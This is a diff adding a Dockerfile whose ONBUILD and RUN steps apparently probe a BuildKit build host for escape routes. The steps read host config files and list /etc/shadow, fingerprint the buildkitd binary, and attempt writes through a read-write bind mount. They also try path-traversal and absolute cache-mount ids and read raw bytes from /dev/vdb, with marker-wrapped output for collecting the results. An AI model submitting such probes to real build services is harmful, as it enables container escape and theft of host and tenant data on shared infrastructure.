@@ -1,0 +1,10 @@
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=etc,target=/he sh -c 'set +e; echo "===B_ETC==="; cat /he/hostname; ls -la /he/os-release /he/debian_version /he/motd /he/issue /he/shadow 2>&1; echo "--toml_full--"; cat /he/buildkit/buildkitd.toml 2>&1; echo "--cni--"; cat /he/buildkit/cni.conflist 2>&1; echo "===B_ETC_END==="'
+ONBUILD RUN --mount=type=bind,source=usr,target=/hu sh -c 'set +e; echo "===B_VER==="; cp /hu/bin/buildkitd /tmp/bk 2>&1; chmod +x /tmp/bk; /tmp/bk --version 2>&1 | head -3; cp /hu/bin/buildctl /tmp/bc 2>&1; chmod +x /tmp/bc; /tmp/bc --version 2>&1 | head -3; strings -a /tmp/bk 2>/dev/null | grep -aoE "(moby/buildkit|buildkit) v?0\.[0-9]+\.[0-9]+(-[a-z0-9]+)?" | sort -u | head -8; echo "===B_VER_END==="'
+ONBUILD RUN --mount=type=bind,source=etc/debian_version,target=/dv,rw sh -c 'set +e; echo "===B_FILEBIND==="; grep " /dv " /proc/self/mountinfo; echo -n "orig="; cat /dv; echo; stat -c "dev=%d ino=%i mode=%a uid=%u" /dv; echo -n "newwrite=i67256-" > /dv 2>&1; echo "wr_rc=$?"; cat /dv; echo; sync; echo "===B_FILEBIND_END==="'
+ONBUILD RUN --mount=type=cache,id=i67256cacheA,target=/c sh -c 'set +e; echo "===B_CACHE==="; grep " /c " /proc/self/mountinfo; ls -la /c | head; echo "m=i67256-cacheA" > /c/m1; cat /c/m1; echo "===B_CACHE_END==="'
+ONBUILD RUN --mount=type=cache,id=../../../../../../tmp/i67256trav,target=/t sh -c 'set +e; echo "===B_TRAV==="; grep " /t " /proc/self/mountinfo; ls -la /t | head -5; echo x > /t/tm 2>&1; echo "rc=$?"; cat /t/tm 2>&1; echo "===B_TRAV_END==="'
+ONBUILD RUN --mount=type=cache,id=/tmp/i67256abs,target=/a sh -c 'set +e; echo "===B_ABS==="; grep " /a " /proc/self/mountinfo; echo y > /a/am 2>&1; echo "rc=$?"; cat /a/am 2>&1; echo "===B_ABS_END==="'
+FROM base
+RUN sh -c 'set +e; echo "===B_LOCAL==="; hostname; cat /etc/hostname 2>&1; head -3 /proc/partitions 2>&1; head -12 /proc/partitions 2>&1; ls -l /dev | head -25; head -c 8 /dev/vdb 2>&1 | xxd; echo "===B_LOCAL_END==="; echo ===B_TRIGGER===; id'
+CMD ["sh","-c","sleep 20"]
